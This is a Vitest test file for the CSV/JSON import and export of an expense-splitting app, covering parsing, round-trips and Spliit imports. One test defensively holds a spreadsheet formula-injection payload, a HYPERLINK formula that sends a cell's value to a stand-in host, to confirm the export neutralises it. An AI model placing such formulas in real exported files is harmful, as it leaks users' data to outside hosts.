import { describe, expect, it } from 'vitest'
import { exportCsv, exportJson, parseCsv, parseImport } from '../src/app/data'
import type { GroupView } from '../src/app/app'
import { fold } from '../src/core/fold'
import { encodeHlc } from '../src/core/hlc'
import type { Op } from '../src/core/types'
import { getBalances } from '../src/core/balances'

const G = 'g'
let n = 0
const op = (entity: Op['entity'], entityId: string, set: Record<string, unknown>): Op => ({
  opId: 'o' + ++n, groupId: G, entity, entityId, set, hlc: encodeHlc({ pt: 1_700_000_000_000 + n, c: 0, device: 'aaaaaaaaaaaaaaaa' }), author: 'a',
})

function sampleView(extra: Op[] = []): GroupView {
  const ops = [
    op('group', G, { name: 'Raclette, "2026"', currency: 'EUR' }),
    op('participant', 'p1', { name: 'Ann' }),
    op('participant', 'p2', { name: 'Bob; Jr' }),
    op('expense', 'e1', { title: 'Cheese', date: '2026-11-10', paidBy: 'p1', category: 9, notes: 'two, "big" ones', money: { amount: 1000, currency: 'EUR', splitMode: 'EVENLY', paidFor: [{ participantId: 'p1', shares: 1 }, { participantId: 'p2', shares: 1 }] } }),
    op('expense', 'e2', { title: 'Hotel', date: '2026-11-11', paidBy: 'p2', category: 32, notes: '', money: { amount: 30000, currency: 'EUR', splitMode: 'BY_PERCENTAGE', paidFor: [{ participantId: 'p1', shares: 7000 }, { participantId: 'p2', shares: 3000 }] } }),
    op('expense', 'e3', { title: 'Taxi', date: '2026-11-12', paidBy: 'p1', category: 35, notes: '', money: { amount: 2000, currency: 'EUR', originalAmount: 2200, originalCurrency: 'CHF', rate: 0.909, splitMode: 'BY_SHARES', paidFor: [{ participantId: 'p1', shares: 100 }, { participantId: 'p2', shares: 300 }] } }),
    ...extra,
  ]
  const state = fold(G, ops, { now: 1_800_000_000_000 })
  return { state, record: { id: G, key: '', name: 'x', relays: [], joinedAt: 0, lastOpened: 0 }, ops, pending: new Set(), status: {} } as unknown as GroupView
}

/** Balances keyed by participant name, from parsed rows. */
function balancesByName(rows: ReturnType<typeof parseImport>['rows']) {
  return getBalances(
    rows.map((r, i) => ({ id: 'x' + i, amount: r.amount, paidBy: r.paidBy, splitMode: r.splitMode, paidFor: r.shares.map(([participantId, shares]) => ({ participantId, shares })) })),
  )
}

describe('import / export', () => {
  it('parses quoted CSV with commas, quotes and semicolons', () => {
    expect(parseCsv('a,b\n"x, ""y""",z\n')).toEqual([['a', 'b'], ['x, "y"', 'z']])
    expect(parseCsv('a;b\r\n1,5;2\r\n')).toEqual([['a', 'b'], ['1,5', '2']])
  })

  it('CSV export neutralises spreadsheet formulas and import restores the text', () => {
    const view = sampleView([
      op('participant', 'p3', { name: '@evil' }),
      op('expense', 'e4', { title: '=HYPERLINK("https://x.example/?"&B2,"click")', date: '2026-11-13', paidBy: 'p3', category: 0, notes: '+1 more', money: { amount: -500, currency: 'EUR', splitMode: 'EVENLY', paidFor: [{ participantId: 'p3', shares: 1 }] } }),
    ])
    const csv = exportCsv(view)
    for (const line of csv.split('\n')) for (const cell of parseCsv(line)[0] ?? []) expect(cell).not.toMatch(/^[=+@]/)
    expect(csv).toContain(',-5.00,') // numbers stay numbers
    const row = parseImport(csv, 'x.csv').rows.find((r) => r.amount === -500)!
    expect(row.title).toBe('=HYPERLINK("https://x.example/?"&B2,"click")')
    expect(row.notes).toBe('+1 more')
    expect(row.paidBy).toBe('@evil')
  })

  it('CSV export → import keeps every amount, payer and share', () => {
    const view = sampleView()
    const csv = exportCsv(view)
    const parsed = parseImport(csv, 'x.csv')
    expect(parsed.rows).toHaveLength(3)
    expect(parsed.participants.sort()).toEqual(['Ann', 'Bob; Jr'])
    const cheese = parsed.rows.find((r) => r.title === 'Cheese')!
    expect(cheese.notes).toBe('two, "big" ones')
    expect(cheese.splitMode).toBe('EVENLY')
    const taxi = parsed.rows.find((r) => r.title === 'Taxi')!
    expect(taxi.originalCurrency).toBe('CHF')
    expect(taxi.originalAmount).toBe(2200)
    expect(taxi.category).toBe(35)
    // Same balances as the original group (by name).
    const names = new Map(view.state.participants.map((p) => [p.id, p.name]))
    const orig = getBalances(view.state.expenses.map((e) => ({ id: e.id, amount: e.money.amount, paidBy: names.get(e.paidBy)!, splitMode: e.money.splitMode, paidFor: e.money.paidFor.map((p) => ({ participantId: names.get(p.participantId)!, shares: p.shares })) })))
    const back = balancesByName(parsed.rows)
    for (const name of ['Ann', 'Bob; Jr']) expect(back[name].total).toBe(orig[name].total)
  })

  it('JSON export → import keeps split modes exactly', () => {
    const parsed = parseImport(exportJson(sampleView()), 'x.json')
    expect(parsed.name).toBe('Raclette, "2026"')
    expect(parsed.currency).toBe('EUR')
    const hotel = parsed.rows.find((r) => r.title === 'Hotel')!
    expect(hotel.splitMode).toBe('BY_PERCENTAGE')
    expect(hotel.shares).toEqual([['Ann', 7000], ['Bob; Jr', 3000]])
  })

  it('reads a Spliit JSON export', () => {
    const spliit = {
      id: 'x', name: 'Trip', currency: '€', currencyCode: 'EUR',
      participants: [{ id: 'a', name: 'Ann' }, { id: 'b', name: 'Bob' }],
      expenses: [{ id: 'e', expenseDate: '2026-01-02T00:00:00.000Z', title: 'Dinner', category: { grouping: 'Food and Drink', name: 'Dining Out' }, amount: 5000, originalAmount: null, originalCurrency: null, conversionRate: null, paidById: 'a', paidFor: [{ participantId: 'a', shares: 100 }, { participantId: 'b', shares: 100 }], isReimbursement: false, splitMode: 'EVENLY', recurrenceRule: 'NONE', notes: null }],
    }
    const parsed = parseImport(JSON.stringify(spliit))
    expect(parsed.rows[0]).toMatchObject({ date: '2026-01-02', title: 'Dinner', category: 8, amount: 5000, paidBy: 'Ann' })
    expect(parsed.currency).toBe('EUR')
  })

  it('rejects a CSV without the needed columns', () => {
    expect(() => parseImport('foo,bar\n1,2', 'x.csv')).toThrow(/Date, Title, Amount/)
  })
})
